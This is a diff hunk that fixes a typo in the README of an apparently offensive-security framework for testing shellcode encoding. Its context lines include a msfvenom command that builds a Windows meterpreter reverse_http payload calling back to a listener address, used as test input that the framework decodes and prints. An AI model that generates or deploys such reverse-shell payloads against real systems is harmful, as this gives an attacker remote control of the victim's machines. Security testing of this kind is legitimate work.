@@ -65,7 +65,7 @@ I made this framework based on it to test it for myself.
 
 ## Results
 
-Tests have been performed with einer "random" - a alphanumeric 20 byte string as "shellcode". And "metasploit" 
+Tests have been performed with either "random" - a alphanumeric 20 byte string as "shellcode". And "metasploit" 
 with output of `msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f raw -o beacon.bin`. 
 The "metasploit" does not execute the shellcode, only decodes and prints it. 
 
